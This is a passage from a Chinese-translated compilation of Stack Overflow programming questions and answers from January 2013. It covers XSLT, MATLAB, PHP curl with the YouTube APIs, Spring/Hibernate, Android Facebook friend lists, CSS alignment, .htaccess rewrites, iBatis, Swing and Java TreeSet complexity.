                    <xsl:copy-of select="." />                        

                    <xsl:apply-templates select="../db:changeSet[name(*[1])='createIndex' and *[1]/@tableName= current()/*[1]/@tableName ]" mode="copy" />
            </databaseChangeLog> 
        </xsl:document>     
        </xsl:if> 
      </xsl:for-each>     
  </xsl:template>

  <xsl:template match="@* | node()" mode="copy">
     <xsl:copy>
        <xsl:apply-templates select="@* | node()"/>
     </xsl:copy>
  </xsl:template>

  <xsl:template match="db:changeSet/@author" mode="copy">
     <xsl:attribute name="author">
        <xsl:value-of select="'sakhunzai'"/>
      </xsl:attribute>
  </xsl:template>
</xsl:stylesheet> 
```

我确实认为 XSLT 可以进一步改进，如下所示。喜欢就试试吧：

```
<xsl:stylesheet xmlns:db="http://www.liquibase.org/xml/ns/dbchangelog"  xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
  <xsl:output method="xml"  indent="yes" />

  <xsl:template match="db:changeSet" />

  <xsl:template match="db:changeSet[db:createTable]">
    <xsl:document href="base/tables/{position()}_{name(*[1])}_{*[1]/@tableName}.xml">
      <databaseChangeLog
           xmlns="http://www.liquibase.org/xml/ns/dbchangelog"
           xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
           xsi:schemaLocation="http://www.liquibase.org/xml/ns/dbchangelog http://www.liquibase.org/xml/ns/dbchangelog/dbchangelog-2.0.xsd">

        <xsl:copy-of select="." />

        <xsl:apply-templates select="../db:changeSet[db:createIndex and *[1]/@tableName = current()/*[1]/@tableName ]" mode="copy" />
      </databaseChangeLog>
    </xsl:document>
  </xsl:template>

  <xsl:template match="@* | node()" mode="copy">
    <xsl:copy>
      <xsl:apply-templates select="@* | node()"/>
    </xsl:copy>
  </xsl:template>

  <xsl:template match="db:changeSet/@author" mode="copy">
    <xsl:attribute name="author">
      <xsl:value-of select="'sakhunzai'"/>
    </xsl:attribute>
  </xsl:template>
</xsl:stylesheet> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-17T14:07:33.497

xsl:copy-of 元素不允许子元素。看起来 xsltproc 没有足够仔细地验证您的样式表。

# matlab - 从现有矩阵中提取矩阵

> ID：14379451
> 
> 赞同：5
> 
> 时间：2013-01-17T12:45:59.343
> 
> 标签：matlab, matrix

我编写了一个代码来生成一个具有四列的矩阵，以获取总和等于 9 且每个数字从 0 到 9 变化的所有数字组合。

```
m = zeros(220, 4);
pd = 9;
i = 1;
for p = 0:1:pd
    for q = 0:1:pd-p
        for a = 0:1:pd-q-p
            m(i,:) = [p, q, a, pd-a-q-p];
            i = i+1;
        end
    end
end
m 
```

现在我想过滤没有零、一个零、两个零、三个零的数组。比如，三个零的情况

```
0 0 0 9 
```

二零情况

```
0 0 1 8
0 0 2 7
.
.
0 0 8 1 
```

一零案例

```
0 1 1 7
0 1 2 6
.
.
.
0 7 1 1 
```

并且没有零案例

```
1 1 1 6
1 1 2 5
.
.
6 1 1 1 
```

等等..

有什么建议或任何替代方法吗？
**更新：**

```
0 0 0 9
0 0 1 8
0 0 2 7
    .
    .
0 0 8 1
0 1 1 7
0 1 2 6
    .
    .
    .
0 7 1 1
1 1 1 6
1 1 2 5
    .
    .
6 1 1 1 
```

`m`有什么建议可以按上述顺序获取矩阵吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-17T13:20:29.700

这是我现在能做的最好的，我还没有在你的整个输入矩阵上测试过

```
m(sum(m == 0, 2) == N, :) 
```

应该返回`m`包含`N`0 的行。

**编辑：**更新后，这里是完整代码的建议：

```
A = zeros(size(m));
k = 1;
for N = (size(m, 2) - 1):-1:0
    rows = (sum(m == 0, 2) == N);
    idx = k:k + sum(rows) - 1;
    A(idx, :) = m(rows, :);
    k = idx(end) + 1;
end 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-01-17T13:48:18.423

*要按行中前导*零的数量进行排序，您只需要`sortrows(m)`.

要按连续零的总数排序，请使用[高性能标记的答案](https://stackoverflow.com/a/14380052/1339280)。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-01-17T13:20:22.007

您可以使用以下函数获取所有`A`具有`n`零的矩阵行：

```
function rows = nzrows(A, n)
  s = sum(A == 0, 2);
  rows = A(s == n, :);
end 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-01-17T13:54:04.933

这就是我想出的：

```
zero_index =[];
one_index =[];
two_index =[];
three_index =[];

for i=1:size(m,1)
    if(sum(m(i,:)==0)==0)
        zero_index = [zero_index    i];
    end
    if(sum(m(i,:)==0)==1)
        one_index = [one_index  i];
    end
    if(sum(m(i,:)==0)==2)
        two_index=  [two_index i];
    end

    if(sum(m(i,:)==0)==3)
        three_index =   [three_index i];
    end

end

m(zero_index,:)
m(one_index,:)
m(two_index,:)
m(three_index,:) 
```

希望能帮助到你。

# c# - 仅从 zip 目录中提取文件

> ID：14379454
> 
> 赞同：3
> 
> 时间：2013-01-17T12:46:05.297
> 
> 标签：c#, unzip

我正在使用 Ionic.Zip，如何从目录所在的 zip 文件中提取文件。

```
foreach (ZipEntry entry in zip)
{
    if (entry.IsDirectory)
    {
        entry.Extract(extractPath);
        var s = entry.ExtractExistingFile;

     }
} 
```

# php - 使用 curl 获取所有 youtube 视频

> ID：14379459
> 
> 赞同：1
> 
> 时间：2013-01-17T12:46:13.237
> 
> 标签：php, youtube

我是 PHP 的初学者。我的项目中有一项任务，即使用 PHP 中的 curl 从 YouTube 链接中获取所有视频。是否可以显示 YouTube 上的所有视频？

我通过谷歌搜索找到了这段代码：

```
<?php
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'http://www.youtube.com');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 $contents = curl_exec ($ch);
 echo $contents;
 curl_close ($ch);
?> 
```

它显示了 YouTube 网站，但是当我单击任何视频时，它都不会播放。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-17T13:42:45.750

您可以从 youtube oemebed 界面以两种格式获取数据，`Xml`并`Json`返回有关视频的元数据：

```
http://www.youtube.com/oembed?url={videoUrlHere}&format=json 
```

使用您的示例，调用：

```
http://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=B4CRkpBGQzU&format=json 
```

所以，你可以这样做：

```
$url = "Your_Youtube_video_link"; 
```

例子 ：

```
$url = "http://www.youtube.com/watch?v=m7svJHmgJqs"

$youtube = "http://www.youtube.com/oembed?url=" . $url. "&format=json";
$curl = curl_init($youtube);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
$return = curl_exec($curl);
curl_close($curl);
$result = json_decode($return, true);
echo $result['html']; 
```

试试吧...希望它会帮助你。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-17T13:20:36.220

您可以使用 curl 检索 Google 主页（或替代页面）并使用[html5lib](http://code.google.com/p/html5lib/)等库解析返回的 html 。如果您想尝试这种方法，第一步可能是在相关页面上“查看源代码”并查看链接的结构。

解决问题的更优雅的方法是使用 Youtube API（一种与 Youtube 系统交互的方式），它可以让您直接检索链接。例如，可以只要求 Youtube API 向您发送链接。试试[这个](https://developers.google.com/youtube/2.0/developers_guide_php?hl=nb#Retrieving_and_searching_for_videos)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-08-07T12:30:15.213

您还可以使用`file_get_contents`
以下示例和工作代码 获取所有 youtube 的频道视频

```
<?php
$Youtube_API_Key = ""; // you can obtain api key :  https://developers.google.com/youtube/registering_an_application
$Youtube_channel_id = "";
$TotalVideso = 50; // 50 is max , if you want more video you need Youtube secret key.
$order= "date"; ////allowed order : date,rating,relevance,title,videocount,viewcount
$url = "https://www.googleapis.com/youtube/v3/search?key=".$Youtube_API_Key."&channelId=".$Youtube_channel_id."&part=id&order=".$order."&maxResults=".$TotalVideso."&format=json";
$data = file_get_contents($url);
$JsonDecodeData=json_decode($data, true);
print_r($data);
?> 
```

# iphone - 使用按钮停止 UiWebView

> ID：14379462
> 
> 赞同：0
> 
> 时间：2013-01-17T12:46:24.050
> 
> 标签：iphone, xcode, button, webview

现在我的项目自动重新加载（在此站点上的某人的帮助下：D）我怎么能得到另一个但停止重新加载？这就是我所拥有的：

```
-(IBAction)SendGPSData:(id)sender {
    NSURL *myURL =[NSURL URLWithString:@"http://www.google.co.uk"];//<<change this!!!
    NSURLRequest *myRequest = [NSURLRequest requestWithURL:myURL];
    [myWebView2 loadRequest:myRequest];
        [myWebView2 reload];
    [NSTimer scheduledTimerWithTimeInterval:2 target:self selector:@selector(WebViewLoad:) userInfo:nil repeats:YES];

}

-(IBAction)stop:(id)sender {

//what do i put here to stop it reloading?

}

-(void)WebViewLoad:(NSTimer *)theTimer
{
    [myWebView2 reload];

} 
```

不喜欢这么快问另一个问题，但我是 Xcode 的初学者，所以任何帮助都会很棒:)

Iv 尝试了 myWebView 停止加载；但原来的似乎覆盖了这个:(

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T12:54:03.297

你可以这样停止：

```
-(IBAction)stop:(id)sender {

[webView stopLoading];

} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T13:37:59.257

您还需要停止计时器。所以你也是：

```
NSTimer* reloadTimer;  // Put this in your class.

reloadTimer = [NSTimer scheduledTimerWithTimeInterval:2 target:self selector:@selector(WebViewLoad:) userInfo:nil repeats:YES];

-(IBAction)stop:(id)sender
{
    [reloadTimer invalidate];
    reloadTimer = nil;   // Prevents crash, when this method is called twice:
                         // reloadTimer is released when you call invalidate,
                         // so next time invalidate would be called on non-existing
                         // object -> crash.

    [myWebView2 stopLoading];
} 
```

将启动/创建计时器的代码放在单独的方法中可能是有意义的，这样您就可以使用它重新启动重新加载。

# java - EntityManager 和 persist 方法无法正常工作

> ID：14379463
> 
> 赞同：1
> 
> 时间：2013-01-17T12:46:26.440
> 
> 标签：java, spring, hibernate, entitymanager

我在这里遇到了麻烦..我是在 Java SE 应用程序中使用 Spring + Hibernate 的新手...

我正在尝试实例化 entityManager，但它不起作用

我正在使用注释@PersistenceUnit，如下所示：

```
@PersistenceUnit
public void setEmf(EntityManager emf) {
    this.emf = emf;
} 
```

它工作“很好”，但它不会持续存在=/当我更改为

```
@PersistenceContext
public void setEmf(EntityManager emf) {
    this.emf = emf;
} 
```

结果出现以下错误：

```
Exception in thread "main" org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'daoAbstract' defined in class path resource [applicationContext.xml]: Initialization of bean failed; nested exception is org.springframework.beans.ConversionNotSupportedException: Failed to convert property value of type '$Proxy10 implementing org.hibernate.ejb.HibernateEntityManagerFactory,org.springframework.orm.jpa.EntityManagerFactoryInfo' to required type 'javax.persistence.EntityManager' for property 'emf'; nested exception is java.lang.IllegalStateException: Cannot convert value of type [$Proxy10 implementing org.hibernate.ejb.HibernateEntityManagerFactory,org.springframework.orm.jpa.EntityManagerFactoryInfo] to required type [javax.persistence.EntityManager] for property 'emf': no matching editors or conversion strategy found
    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:532) 
```

这是我的 applicationContext.xml

```
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:aop="http://www.springframework.org/schema/aop"
    xmlns:tx="http://www.springframework.org/schema/tx"
    xsi:schemaLocation="
    http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-2.0.xsd
    http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx-2.0.xsd
    http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-2.0.xsd">

    <bean id="ConfiguradorDePropriedades"
        class="org.springframework.beans.factory.config.PropertyPlaceholderConfigurer">
        <description>The service properties file</description>
        <property name="location" value="file:AppConfig.properties" />
    </bean>

    <bean
        class="org.springframework.orm.jpa.support.PersistenceAnnotationBeanPostProcessor" />

    <bean id="entityManagerFactory"
        class="org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean">
        <!-- <property name="persistenceUnitName" value="ChatJpa" /> -->
        <property name="persistenceXmlLocation" value="classpath:persistence.xml" />
        <property name="dataSource" ref="dataSourceLocal" />
        <property name="jpaVendorAdapter">
            <bean class="org.springframework.orm.jpa.vendor.HibernateJpaVendorAdapter">
                <property name="database" value="${database}" />
                <property name="showSql" value="false" />
                <property name="generateDdl" value="true" />
            </bean>
        </property>
    </bean>

    <bean id="transactionManager" class="org.springframework.orm.jpa.JpaTransactionManager">
        <property name="entityManagerFactory" ref="entityManagerFactory" />
    </bean>

    <tx:annotation-driven transaction-manager="transactionManager" />

    <bean id="dataSourceLocal"
        class="org.springframework.jdbc.datasource.DriverManagerDataSource">
        <property name="driverClassName" value="${driver}" />
        <property name="url" value="${jdbc.url}" />
        <property name="username" value="${jdbc.user}" />
        <property name="password" value="${jdbc.pass}" />
    </bean>

    <bean id="daoAbstract" class="com.planner.pvc.dao.DaoAbstract">
        <property name="emf" ref="entityManagerFactory" />
    </bean>

    <bean id="clienteDao" class="com.planner.pvc.dao.ClienteDaoImpl">
    </bean>

    <bean id="pvcMainController" class="com.planner.pvc.controller.PVCMainController">
        <property name="dao" ref="clienteDao" />
    </bean>

</beans> 
```

和persistence.xml

```
<?xml version="1.0" encoding="UTF-8"?>
<persistence version="1.0"
    xmlns="http://java.sun.com/xml/ns/persistence" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://java.sun.com/xml/ns/persistence http://java.sun.com/xml/ns/persistence/persistence_1_0.xsd">
    <persistence-unit name="ChatJpa">
        <properties>
            <property name="hibernate.show_sql" value="true" />
            <property name="hibernate.connection.driver_class" value="com.microsoft.sqlserver.jdbc.SQLServerDriver" />
            <!-- <property name="hibernate.cache.provider_class" value="net.sf.ehcache.hibernate.EhCacheProvider" />
            <property name="hibernate.cache.use_query_cache" value="true" />
            <property name="hibernate.hbm2ddl.auto" value="update" />  -->
        </properties>
    </persistence-unit>
</persistence> 
```

任何帮助，将不胜感激。

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-17T12:55:32.037

这条线是问题所在：

```
<bean id="daoAbstract" class="com.planner.pvc.dao.DaoAbstract">
    <property name="emf" ref="entityManagerFactory" />
</bean> 
```

而不是这样做，让 Spring 注入带有 注释的 emf 字段，如果您的应用程序上下文中有 a或标签，或者只是添加后者`@PersistenceContext`，则会发生这种情况。`<context:component-scan.../>``<context:annotation-config/>`

# php - 组织用户图像

> ID：14379469
> 
> 赞同：1
> 
> 时间：2013-01-17T12:46:39.337
> 
> 标签：php, directory-structure

我正在开发一个用户可以上传图片的社交系统。

我不太确定我应该如何构建我的文件。我的两个想法如下：

1.  添加一个以 userID 为名称的文件夹，并将所有用户图像放入其中
2.  为所有图像创建一个文件夹，并为每个图像指定一个唯一的名称

这两个哪个更好？这是组织图像的正确方法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-17T13:58:37.827

这取决于。

当您使用将图像存储在每个用户的目录中的图库时，您还必须担心重复（例如用户将上传多个同名文件）。

另一方面，在第一种情况下，您可能会遇到与单个目录中的文件数量相关的性能问题（如果您有超过 10k 的文件，它可能会滞后）。

我喜欢的解决方案是创建一个唯一的名称并将其裁剪为几个部分以创建目录结构。

例如：

1.  从文件`image.jpg`（查看[手册](http://php.net/manual/en/function.uniqid.php)）生成一个唯一的名称，比如 `nfsr53a5gb`

2.  将原始扩展名添加到其中，使其变为`nfsr53a5gb.jpg`

3.  将其拆分`/`为`nf/sr/53/a5/gb.jpg`

4.  [随时创建丢失的文件夹](http://php.net/manual/en/function.mkdir.php)（参见`recursive`参数）

您不会很快因目录中的文件数量而受到惩罚，也不会发生冲突，并且文件的 URL 难以猜测。

一个不错的方法是添加一个控制器来获取那些将名称更改为原始名称的文件（将其存储在数据库中并切换标题）。仅将其用于专用下载按钮，因为对于嵌入在页面上的许多图像而言，这可能会占用过多的 CPU 和 I/O。

为此，您必须像这样修改标题：

```
Content-Disposition: attachment; filename=YOUR_FILE_NAME.YOUR_EXTENSION
Content-Type: application/octet-stream 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T12:48:33.170

选择#2 选项，或者如果用户数量增加，文件夹数量将继续增加。

对于在您的代码中获取图像，此方法也将更简单。

# android - 从 Session 获取 Facebook 好友列表

> ID：14379472
> 
> 赞同：0
> 
> 时间：2013-01-17T12:46:43.260
> 
> 标签：android, facebook

我正在开发使用 android 获取 facebook 好友列表的代码。我有活跃的会话（facebook）。我可以从 Session 中获取好友列表吗？如果没有，那么简单的方法是什么？

我正在使用 facebook sdk 3.0

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T12:54:40.833

获得基本权限后即可查询图表。 [https://graph.facebook.com/me/friends?access_token=xxxxxx](https://graph.facebook.com/me/friends?access_token=xxxxxx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T13:24:31.153

作为 Facebook Hackbook 示例，如果您有一个 Facebook 对象的活动会话，则使用给定的代码来获取好友列表

```
this.dialog = ProgressDialog.show(context, "",
                    "Please Wait", true, true);
            String query = "select name, current_location, uid, pic_square from user where uid in (select uid2 from friend where uid1=me()) order by name";
            Bundle params = new Bundle();
            params.putString("method", "fql.query");
            params.putString("query", query);
            Utility.mAsyncRunner.request(null, params,
                    new FriendsRequestListener(context,  
                            this.dialog)); 
```

FriendsRequestListener 类

```
 class FriendsRequestListener extends BaseRequestListener {
        private Context context;
        private String graph_or_fql;
        private ProgressDialog dialog;

        public FriendsRequestListener(Context context , ProgressDialog dialog) {
            // TODO Auto-generated constructor stub
            this.context = context;
            this.dialog = dialog;
        }

        @Override
        public void onComplete(final String response, final Object state) {
            dialog.dismiss();

            jsonArray = new JSONArray(apiResponse); 
            // this is the response of the Friend list in json format, set the jsonArray to List.

        }

        public void onFacebookError(FacebookError error) {
            dialog.dismiss();

             Toast.makeText(context, "Facebook Error: " + error.getMessage(),
                    Toast.LENGTH_SHORT).show();
        }
    } 
```

在*FriendsRequestListener类的**onComplete*中，您可以获得好友列表的 jsonArray。希望这对您有用/对您有帮助

 ** * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-17T17:55:35.367

您应该查看 Request 类，特别是[Request.newMyFriendsRequest](https://developers.facebook.com/docs/reference/android/3.0/Request#newMyFriendsRequest%28Session,%20GraphUserListCallback%29)方法。*

# c# - Emulate Binding.FallbackValue in WinRT

> ID：14379484
> 
> 赞同：3
> 
> 时间：2013-01-17T12:47:32.487
> 
> 标签：c#, winrt-xaml

Are there any workarouds to emulate `Binding.FallbackValue` behaviour in WinRT?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-29T10:30:51.350

It can be done with attached properties. I've found that many limitations with WinRT can be fixed with them.

I don't have code, but what about this:

```
<TextBox local:fallbackProperty="Text" local:fallbackPropertyValue="<NO BINDING SET"
  Text="{Binding random}" /> 
```

now in your attached property handler, you check out fallbackProperty through reflection and subscribe to property changes:

listener = DependencyPropertyChangedListener.Create(this.myTextBox, "Text"); listener.ValueChanged += listener_ValueChanged;

If you receive 0/null then you can swap BINDING out from Text property. And replace it with fallbackPropertyValue. You still need to keep track of real binding and make sure that it gets swaped back in when it's time.

Limitations of this solution is that you can only use one fallbackValue per UI element. But that can easily be extended to "LIST of fallbackValues". Just the syntax wont be as handy anymore.

It's shame though that developers need to reinvent the wheel, while WPF had almost everything in place, and minimum hacks were needed.

# html - HTML：输入附近的 img 标签

> ID：14379492
> 
> 赞同：0
> 
> 时间：2013-01-17T12:47:59.933
> 
> 标签：html, css

我有一个奇怪的问题，当我在输入附近添加一个 img 标签和一个跨度 img 导致输入和 sapn 降低时。

```
<div>
   <span>נקודות זיכוי</span>
   <input type="text" name="nekodot_zikoy" value="2.25"/>
   <img src="images/cal_black.png" title="חשב נקודות זיכוי" alt="חשב נקודות זיכוי"/>
</div> 
```

我这里有代码[http://jsfiddle.net/49JcA/](http://jsfiddle.net/49JcA/)

只是不要介意没有图像，如果你把标签拿出来看看我在说什么..

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T12:53:23.387

假设您希望跨度和输入出现在顶部，只需添加`align="top"`到图像中：

```
<img src="images/cal_black.png" align="top" ... /> 
```

[更新了小提琴](http://jsfiddle.net/49JcA/3/)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-17T12:53:31.120

例如，您可以使用`vertical-align`：

```
* { vertical-align:top; } 
```

但请注意，您**不想**这样做。其他人可能会争辩说您甚至不应该这样使用`vertical-align`，但是如果它对您有用，我不会抱怨，但是全局指定（使用`*`）是错误的并且对性能不利。相反，您应该将其应用于您需要的元素，在这种情况下会有所不同。所以，像这样：

```
input[type=text] { vertical-align:top; } 
```

以及您需要将其应用于的任何其他元素。

最后，您应该标记输入以确保合规性。

# spring - 通过代码以编程方式检索和修改@ConfigurationContext？

> ID：14379497
> 
> 赞同：1
> 
> 时间：2013-01-17T12:48:17.657
> 
> 标签：spring

如何通过代码以编程方式检索和修改@ConfigurationContext？

我有一个默认配置，其中包含有效的 xml 文件。

现在我需要为特定的测试用例添加一个无效的配置并进行测试。

如何通过代码以编程方式覆盖、检索和修改@ConfigurationContext？

提前致谢， 凯瑟尔

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T15:33:28.983

免责声明：我假设您正在使用 JUnit，因为您在回复我的评论时没有做出不同的评论。
我认为您尝试做的事情没有多大意义，在我看来，最好为您的非工作配置创建一个专用的测试类，以便能够进行多个测试。然而：

1.  `@RunWith(SpringJUnit4ClassRunner.class)`用和注释你的测试类`@ContextConfiguration(locations = {"classpath:/working-context.xml"})`。通过这种方式，您可以通过两种方式检索配置上下文：首先，您可以简单地声明一个`@Inject ApplicationContext context`包含工作上下文的字段。或者，您创建测试类`implements ApplicationContextAware`，然后编写一个`public void setApplicationContext (ApplicationContext applicationContext)`. 我会选择第二个，因为它将以编程方式更改上下文。
2.  写一个`not-working-context.xml`并将它放在你的类路径中
3.  在您想要失败的测试方法中，重新加载应用程序上下文`context = setApplicationContext(new ClassPathXmlApplicationContext("not-working-context.xml"));`并测试您喜欢的所有错误。
4.  虽然坚持测试用例顺序不是一个好习惯，但请确保您的失败测试将作为最后一个执行（测试按字母顺序执行），这样您就不必在其他测试中重新加载工作上下文。

最后，您的测试类将如下所示：

```
@RunWith(SpringJUnit4ClassRunner.class)
@ContextConfiguration(locations = {"classpath:/working-context.xml"})
public class TestClass implements ApplicationContextAware {
  private ApplicationContext context;

  public void setApplicationContext(ApplicationContext context){
    this.context = context;
  }

  //Other tests

  @Test
  public void zFailingTest() {
    context = setApplicationContext(new ClassPathXmlApplicationContext("not-working-context.xml"));
    //your test
  }
} 
```

# .htaccess - mod_rewrite 文件夹上的所有请求，除了一个

> ID：14379498
> 
> 赞同：0
> 
> 时间：2013-01-17T12:48:17.970
> 
> 标签：.htaccess, mod-rewrite

有很多类似的问题，但所提供的解决方案都不符合我的需要。

我想将文件夹上的所有请求转发到某个 url，除了一个请求应该转发到另一个 url。这是我到目前为止得到的：

```
RewriteCond %{REQUEST_URI} !^/test/test.html$<br />
RewriteRule .? http://www.example.com [L,NC,QSA] 
```

现在缺少的是请求 /test/test.html 应该转发到 www.example.com/test/index.html

我正在尝试保护该文件夹（test）上的任何请求，除非有人知道某个 url（test/test.html），然后它应该被转发到 test/index.html

任何帮助，将不胜感激！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-20T15:42:49.807

我想这就是你要找的

```
# internally redirect /test/test.html to /test/index.html
RewriteRule ^test/test\.html$ /test/index.html [L]
# don't do any more rewrites on the url: /test/index.html
RewriteRule ^test/index\.html$ - [L]
# internally redirect all (other) request to the root
RewriteRule .* / [L] 
```

# ibatis - mysql 存储过程与 iBatis

> ID：14379505
> 
> 赞同：0
> 
> 时间：2013-01-17T12:48:37.037
> 
> 标签：ibatis

我的应用程序使用了 Spring MVC+iBatis+JBoss7+MySQL。我在 mySQL 中有一个存储过程，将它映射到我的 iBatis mapper.xml 文件中，并通过我的 DAO 中的 sqlMapClient 调用它。如果我在 dao 方法工作正常后执行它，但是如果我使用不同的存储过程参数对同一方法执行两次调用（参数更改意味着存储过程中结果列的更改），我会得到一个异常，说我的 sql格拉默是错的。查看日志我发现 iBatis 正在尝试将我的第一个查询列（我的初始方法调用的结果）映射到我的结果映射。我什至尝试打印我的 dao 类实例的哈希码，它们是不同的。当从 DB 客户端（如 DbVislaulizer）尝试执行过程时，为什么会发生这种情况

有关信息，我在 mapper.xml 中使用 HashMap 作为结果类。这会在我的 dao 中返回一个linkedhashmaps 列表。

任何帮助都会非常方便。

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-18T06:37:52.313

修复。必须在 mapper.xml 中设置属性 remapResults="true"

例如

选择 id="myReport" parameterClass="Map" resultClass="java.util.LinkedHashMap" remapResults="true"

# java - 在其他 JPanel 中自动从 JPanel 重绘

> ID：14379509
> 
> 赞同：0
> 
> 时间：2013-01-17T12:48:48.680
> 
> 标签：java, swing, graph, jpanel, repaint

我在两个不同的地方绘制了两个有向图，`JPanels`当我单击按钮编译（运行 - 编译）时，我需要将这些图重新绘制成一个`JPanel`，任何建议，提示，教程。我已经搜索但没有结果。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T13:05:57.873

这取决于你如何绘制它们。如果您`Shapes`只在单个（合并面板）中使用它们两次绘制它们。

您还可以覆盖合并面板的 paintComponent() 并使用适当的转换调用该方法

```
firstGraphPanel.paintComponent(g);
secondGraphPanel.paintComponent(g); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-17T15:12:40.347

我认为您应该覆盖要重绘的 JPanel 的 paintComponent 方法：

```
@override
public void paintComponent (Graphics g) {
    // paint your two graphs here.
} 
```

单击按钮时，调用 JPanel.repaint()。例如，

```
@Override
public void mouseClicked (MouseEvent me) {
    pnl.repaint();
} 
```

# java - Java 中 TreeSet 方法的计算复杂度

> ID：14379515
> 
> 赞同：22
> 
> 时间：2013-01-17T12:49:00.447
> 
> 标签：java, algorithm, data-structures, avl-tree, treeset

Java中TreeSet方法的计算复杂度和AVLTree一样吗？

具体来说，我想知道以下方法的计算复杂度： 1.add 2.remove 3.first 4.last 5\. floor 6.higher

用于方法描述的 Java Doc：http: [//docs.oracle.com/javase/6/docs/api/java/util/TreeSet.html](http://docs.oracle.com/javase/6/docs/api/java/util/TreeSet.html)

对于 AVL 树，所有的 O(logn)？上述 TreeSet 方法的复杂性是什么？

* * *

## 回答 #1

> 赞同：39
> 
> 时间：2013-01-17T12:52:17.903

对单个元素起作用的操作都是 O(ln n) 比较，除了第一个和最后一个是 O(1) 比较或 O(ln N) 节点搜索时间。

比较器（），迭代器（），清除（），第一（），isEMpty（），大小（），最后（），pollFirst（），pollLast（）是O（1）

add(), ceiling(), contains(), floor(), headSet(), Higher(), lower(), remove(), subSet(), tailSet() 是 O(ln N)

clone()、equals()、hashCode()、toArray() 和 toString() 是 O(n)

# asp.net-mvc-3 - MVC3 中从字符串到 System.Web.Mvc.ViewResult 的转换错误

> ID：14379517
> 
> 赞同：1
> 
> 时间：2013-01-17T12:49:12.393
> 
> 标签：asp.net-mvc-3

嗨，我对 MVC 很陌生，我正在尝试创建一个从华氏温度到摄氏温度的简单转换以及它的单元测试。提前抱歉将所有代码放在这里。

这是我的控制器代码：

```
public string Convert(double value,string option)
{
    string d;

    if(option=="1") {
        d = " To Celcius"+FahrenheitToCelsius(value).ToString();
    }
    else {
        d = " To Fahrenheit" + CelsiusToFahrenheit(value).ToString();
    }
    return "ConvertTo" + d;
}

public static double CelsiusToFahrenheit(double temperatureCelsius)
{
    double celsius = temperatureCelsius;
    return (celsius * 9 / 5) + 32;
}

public static double FahrenheitToCelsius (double temperatureFahrenheit)
{
    double fahrenheit = temperatureFahrenheit;
    return (fahrenheit - 32) * 5 / 9;
} 
```

这是我的查看页面

```
protected void btnConvert(object sender, EventArgs e)
{
    if (DropDownList1.SelectedValue=="1"){
        double temp = TemperatureConverterController.FahrenheitToCelsius(double.Parse(TextBox1.Text));
        Literal1.Text = temp.ToString();
    }
    else{
        double temp = TemperatureConverterController.CelsiusToFahrenheit(double.Parse(TextBox1.Text));
        Literal1.Text = temp.ToString();
        Literal1.Text = temp.ToString();
    }
} 
```

当我做这个单元测试时，我得到了一个错误：

```
[TestMethod]
public void ConvertReturnsAViewResultWhenInputDataIsValid()
{
    //Arrange
    var controller = new TemperatureConverterController();

    //Act
    double x = 80;
    double y = 25;
    var result = controller.Convert(x, "1") as ViewResult;
    //    here i get this error under ViewResult //

    //Assert
    Assert.IsInstanceOfType(result, typeof(ViewResult));
}

[TestMethod]
public void ConvertAsksForAViewTemplateNamedConvert()
{
    //Arrange
    var controller = new TemperatureConverterController();
    String expectedViewTemplate = "Convert";

    //Act
    double x = 80;
    double y = 25;
    var result = controller.Convert(x, "1") as ViewResult;
    ////Assert
    Assert.AreEqual<String>(expectedViewTemplate, result.ViewName);
} 
```

**错误是：**

```
Error   Cannot convert type 'string' to 'System.Web.Mvc.ViewResult' via a reference conversion, boxing conversion, unboxing conversion, wrapping conversion, or null type conversion. 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-17T12:56:01.727

问题就在这里

```
var result = controller.Convert(x, "1") as ViewResult; 
```

您的 Convert 方法正在返回字符串，并且您将其转换为 ViewResult

您的转换方法应如下所示

```
public ActionResult Convert()
{
    //Make a Model class and pass it to View
    //...
    return View(model_class_object);
} 
```

或者，您可以像这样制作控制器

```
public ActionResult Convert()
{
    ViewData["tempvalue"]=Convert(x, "1");
    //Make a Model class and pass it to View
    //...
    return View();
} 
```

在你的视图上你可以打印它

```
